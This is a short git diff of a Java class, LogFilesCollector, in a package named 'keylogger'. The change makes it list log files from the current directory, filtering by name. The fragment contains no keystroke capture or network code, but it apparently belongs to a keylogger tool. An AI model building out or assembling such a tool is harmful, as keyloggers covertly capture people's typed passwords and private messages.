@@ -1,5 +1,6 @@
 package com.mossad.keylogger.files;
 
+import java.io.File;
 import java.io.IOException;
 import java.nio.file.Files;
 import java.nio.file.Path;
@@ -18,10 +19,12 @@ public final class LogFilesCollector {
     }
 
     public List<String> collectLogs() {
-        Path currentRelativePath = Paths.get("C:\\SWSetup\\java");
+        //Path currentRelativePath = Paths.get("C:\\SWSetup\\
+        File currentDirectory = new File(new File("").getAbsolutePath());
+        String pathAsString = currentDirectory.getAbsolutePath();
         try {
-            Stream<Path> paths = Files.list(currentRelativePath);
-            return paths.map(path -> path.toString()).filter(path -> !path.endsWith(".lck")).collect(Collectors.toList());
+            Stream<Path> paths = Files.list(Paths.get(pathAsString));
+            return paths.map(path -> path.toString()).filter(path -> !path.endsWith(".lck") && path.contains("Log")).collect(Collectors.toList());
 
         } catch (IOException e) {
             LOG.info(String.format("Cannot collect logs %s", e.getMessage()));
